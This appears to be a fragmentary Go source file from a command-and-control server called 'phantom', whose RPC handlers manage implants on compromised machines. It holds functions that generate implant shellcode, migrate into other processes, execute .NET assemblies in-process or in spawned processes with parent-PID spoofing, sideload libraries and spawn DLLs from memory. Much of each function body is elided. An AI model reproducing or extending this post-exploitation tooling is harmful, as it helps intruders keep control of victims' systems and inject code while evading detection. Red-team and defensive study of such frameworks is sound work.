...
import (
	...
	shellcodeencoders "github.com/cryptdefender3232/phantom/server/encoders/shellcode"
...
func (rpc *Server) Task(ctx context.Context, req *phantompb.TaskReq) (*phantompb.Task, error) {
	resp := &phantompb.Task{Response: &commonpb.Response{}}
...
func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*phantompb.Migrate, error) {
	var sc []byte
	...
	sc, arch, err := getPhantomShellcode(name)
	if err != nil {
		config := req.Config
		if req.Name == "" {
		...
		shellcodePath, err := generate.PhantomShellcode(name, build, config, httpC2Config.ImplantConfig)
		if err != nil {
			return nil, rpcError(err)
		}
	...
	resp := &phantompb.Migrate{Response: &commonpb.Response{}}
...
func (rpc *Server) ExecuteAssembly(ctx context.Context, req *phantompb.ExecuteAssemblyReq) (*phantompb.ExecuteAssembly, error) {
	var session *core.Session
	var beacon *clientpb.Beacon
	var dbBeacon *models.Beacon
	var err error
	...
	resp := &phantompb.ExecuteAssembly{Response: &commonpb.Response{}}
	if req.InProcess {
		tasksLog.Infof("Executing assembly in-process")
		invokeInProcExecAssembly := &phantompb.InvokeInProcExecuteAssemblyReq{
			Data:       req.Assembly,
			Runtime:    req.Runtime,
		...
		invokeExecAssembly := &phantompb.InvokeExecuteAssemblyReq{
			Data:        shellcode,
			Process:     req.Process,
			Request:     req.Request,
			PPid:        req.PPid,
...
func (rpc *Server) Sideload(ctx context.Context, req *phantompb.SideloadReq) (*phantompb.Sideload, error) {
	var (
	...
	resp := &phantompb.Sideload{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(req, resp)
	if err != nil {
		return nil, rpcError(err)
	}
...
func (rpc *Server) SpawnDll(ctx context.Context, req *phantompb.InvokeSpawnDllReq) (*phantompb.SpawnDll, error) {
	var session *core.Session
	var beacon *clientpb.Beacon
	var dbBeacon *models.Beacon
	var err error
	...
	resp := &phantompb.SpawnDll{Response: &commonpb.Response{}}
	offset, err := getExportOffsetFromMemory(req.Data, req.EntryPoint)
	if err != nil {
		return nil, status.Error(codes.InvalidArgument, err.Error())
	}
	spawnDLLReq := &phantompb.SpawnDllReq{
		Data:        req.Data,
		Offset:      offset,
		ProcessName: req.ProcessName,
		Args:        req.Args,
...
// Utility functions
func getPhantomShellcode(name string) ([]byte, string, error) {
	var data []byte
